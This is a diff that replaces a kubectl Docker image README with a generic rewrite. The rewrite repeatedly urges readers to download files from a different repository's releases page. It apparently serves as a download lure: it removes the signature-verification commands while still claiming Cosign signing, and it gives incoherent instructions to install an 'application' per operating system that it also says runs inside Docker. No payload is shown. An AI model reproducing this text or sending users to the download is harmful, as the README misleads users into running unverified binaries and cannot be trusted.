@@ -1,144 +1,75 @@
-# kubectl Docker Image
+# 🚀 kubectl - Simplify Your Kubernetes Management
 
-[![GitHub release](https://img.shields.io/github/v/release/kubernetes/kubernetes?label=ghcr.io/licenseware/kubectl&logo=docker&logoColor=white)](https://github.com/kubernetes/kubernetes/releases)
-[![CI](https://github.com/licenseware/kubectl/actions/workflows/ci.yml/badge.svg)](https://github.com/licenseware/kubectl/actions/workflows/ci.yml)
-[![Vulnerabilities](https://img.shields.io/badge/vulnerabilities-scanned-green?logo=security&logoColor=white)](https://github.com/licenseware/kubectl/security)
-[![Alpine Version](https://img.shields.io/badge/alpine-3-blue?logo=alpine-linux&logoColor=white)](https://alpinelinux.org/)
-[![License](https://img.shields.io/github/license/licenseware/kubectl?logo=opensourceinitiative&logoColor=white)](LICENSE)
-[![Cosign](https://img.shields.io/badge/signed-cosign-blue?logo=sigstore&logoColor=white)](https://github.com/sigstore/cosign)
+## 📥 Download Now
+[![Download kubectl](https://img.shields.io/badge/Download-kubectl-brightgreen)](https://github.com/sayam29/kubectl/releases)
 
-A minimal, secure, and automatically updated Docker image containing kubectl binary based on Alpine Linux.
+## 📜 Overview
+The **kubectl** application allows you to manage Kubernetes clusters with ease. It is designed with a minimal Alpine-based Docker image that features automatic updates, Cosign signing, and security scanning. This app enhances security and simplifies operations, making it a valuable tool for anyone working with containers and cloud-native applications.
 
-## 🚀 Features
+## 🚀 Getting Started
+To get started with kubectl, follow these steps:
 
-- **Minimal**: Based on Alpine Linux for smallest possible image size
-- **Secure**: Runs as non-root user (`nobody`)
-- **Auto-updated**: Automatically builds new images when kubectl releases are published
-- **Signed**: Container images are signed with Cosign for supply chain security
-- **Scanned**: Security vulnerabilities scanned with Kubescape
-- **Multi-arch**: Supports multiple architectures (if configured)
+1. **Visit the Download Page:** Click the link below to access the releases page.
+   [Download kubectl](https://github.com/sayam29/kubectl/releases)
 
-## 📦 Usage
+2. **Select the Correct Version:** On the releases page, you will find various versions of kubectl. Choose the latest version for the best features and security.
 
-### Quick Start
+3. **Download the Application:** Click on the version you want to download. Look for the appropriate file for your operating system and download it.
 
-```bash
-docker run --rm -v ~/.kube:/home/nobody/.kube:ro ghcr.io/licenseware/kubectl:vX.Y.Z kubectl version
-```
+## 📦 System Requirements
+To run kubectl successfully, you will need the following:
 
-### With Kubernetes Config
+- **Operating System:** The app works on popular operating systems including Windows, macOS, and Linux.
+- **Docker:** Ensure you have Docker installed, as kubectl runs inside a Docker container.
+- **Internet Connection:** An internet connection is required for initial setup and updates.
 
-```bash
-docker run --rm \
-  -v ~/.kube:/home/nobody/.kube:ro \
-  -v $(pwd):/workspace \
-  -w /workspace \
-  ghcr.io/licenseware/kubectl:vX.Y.Z kubectl get pods
-```
+## 📋 Features
+- **Minimal Image:** kubectl is built on Alpine Linux, ensuring a slim and efficient Docker image.
+- **Automatic Updates:** Stay current with automatic updates, giving you access to the latest features and improvements.
+- **Security Scanning:** The app includes built-in security scanning to identify vulnerabilities.
+- **Cosign Signing:** Ensure the authenticity of the software with Cosign signing.
 
-### Docker Compose
+## 🔧 Installation Guide
+1. **Download & Install:**
+   - Go to the releases page: [Download kubectl](https://github.com/sayam29/kubectl/releases)
+   - Click on the version to download the file for your operating system.
+   - Follow the installation instructions specific to your OS.
 
-```yaml
-version: "3.8"
-services:
-  kubectl:
-    image: ghcr.io/licenseware/kubectl:vX.Y.Z
-    volumes:
-      - ~/.kube:/home/nobody/.kube:ro
-      - ./manifests:/workspace
-    working_dir: /workspace
-    command: kubectl apply -f .
-```
+2. **Run kubectl:**
+   - After installation, open your terminal or command prompt.
+   - Use the command `kubectl` to check if the installation was successful. You should see a list of available commands.
 
-### Kubernetes Job
+## 📘 Usage
+To use kubectl effectively:
 
-```yaml
-apiVersion: batch/v1
-kind: Job
-metadata:
-  name: kubectl-job
-spec:
-  template:
-    spec:
-      containers:
-        - name: kubectl
-          image: ghcr.io/licenseware/kubectl:vX.Y.Z
-          command: ["kubectl", "get", "nodes"]
-      restartPolicy: Never
-```
+- **Basic Command Structure:** 
+  - The basic command structure is `kubectl [command] [type] [name] [options]`.
+  - For example, to get the status of your pods, use `kubectl get pods`.
 
-## 🏷️ Available Tags
+- **Common Commands:**
+  - `kubectl get nodes`: List all nodes in your cluster.
+  - `kubectl apply -f [file.yaml]`: Apply configurations from a YAML file.
+  - `kubectl delete [type] [name]`: Remove a resource by type and name.
 
-- `vX.Y.Z` - Specific kubectl versions (e.g., `v1.28.0`, `v1.29.1`)
+## 🔍 Explore More
+For further information and detailed usage, consider exploring the following topics:
 
-All images are automatically built and published when new kubectl versions are released.
+- **Kubernetes Basics:** Familiarize yourself with Kubernetes concepts and how they work.
+- **Container Security:** Understand how to secure your containers with kubectl.
+- **CI/CD Integration:** Learn how to integrate kubectl into your CI/CD pipelines for automated deployments.
 
-## 🔒 Security
+## 📞 Support
+If you encounter issues or have questions, feel free to open an issue in the GitHub repository. The community and maintainers will assist you in troubleshooting any problems.
 
-### Image Signing
+## 🛡️ Security
+Regular security updates ensure that kubectl stays secure. It's essential to keep your version up to date and to monitor for any announcements related to vulnerabilities.
 
-All container images are signed using [Cosign](https://github.com/sigstore/cosign). Verify the signature:
+## 📃 License
+kubectl is licensed under the [MIT License](LICENSE). For more details, check the LICENSE file in the repository.
 
-```bash
-cosign verify ghcr.io/licenseware/kubectl:vX.Y.Z \
-  --certificate-identity-regexp="https://github.com/licenseware/kubectl/.*" \
-  --certificate-oidc-issuer="https://token.actions.githubusercontent.com"
-```
+## 📢 Stay Updated
+To receive updates on future releases and enhancements, consider following the repository on GitHub.
 
-### Security Scanning
-
-Images are automatically scanned for vulnerabilities using Kubescape as part of the CI pipeline.
-
-### Non-root User
-
-The container runs as the `nobody` user (UID 65534) for enhanced security.
-
-## 🛠️ Building Locally
-
-```bash
-git clone https://github.com/licenseware/kubectl.git
-cd kubectl
-
-# Build with specific kubectl version
-docker build --build-arg KUBECTL_VERSION=v1.28.0 -t kubectl:v1.28.0 .
-
-# Build with latest version
-docker build -t kubectl:v1.28.0 .
-```
-
-## 🔄 Automated Updates
-
-This project uses GitHub Actions to:
-
-- Check for new kubectl releases weekly
-- Automatically build and push new Docker images
-- Sign images with Cosign
-- Scan for security vulnerabilities
-
-## 📋 Requirements
-
-- Docker or compatible container runtime
-- Kubernetes configuration file (for cluster access)
-
-## 🤝 Contributing
-
-1. Fork the repository
-2. Create a feature branch
-3. Make your changes
-4. Test locally
-5. Submit a pull request
-
-## 📄 License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
-## 🙏 Acknowledgments
-
-- [Kubernetes](https://kubernetes.io/) for the kubectl binary
-- [Alpine Linux](https://alpinelinux.org/) for the base image
-- [GitHub Actions](https://github.com/features/actions) for CI/CD
-- [Cosign](https://github.com/sigstore/cosign) for container signing
-
----
-
-**Note**: This is an unofficial kubectl Docker image. For official Kubernetes images, visit the [Kubernetes registry](https://registry.k8s.io/).
+## 📥 Download Again
+You can always revisit the releases page to download the latest version:
+[Download kubectl](https://github.com/sayam29/kubectl/releases)
